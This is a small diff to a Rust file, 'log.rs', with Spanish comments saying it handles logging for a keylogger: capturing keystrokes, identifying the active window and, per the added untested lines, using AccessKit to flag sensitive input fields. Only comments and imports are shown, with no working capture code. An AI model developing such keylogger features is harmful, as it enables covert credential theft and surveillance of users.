@@ -4,10 +4,13 @@
 
 Este archivo de log.rs es para manejar la funcionalidad de registro del keylogger.rs, incluyendo la captura de eventos de teclado, la identificación de la ventana activa y el almacenamiento seguro
 
+WIP: Todavía no lo testee, solo lo pusheo para guardarlo
+Utiliza AccessKit para detectar campos sensibles en la ventana activa y clasificar los logs según su sensibilidad.
+
 */
 
 use chrono::Utc;
-use accesskit::{NodeBuilder, NodeId, Role, Tree, TreeUpdate};
+use accesskit::{NodeBuilder, NodeId, Role, Tree, TreeUpdate}; 
 use accesskit_windows::Adapter;
 use std::collections::HashMap;
 
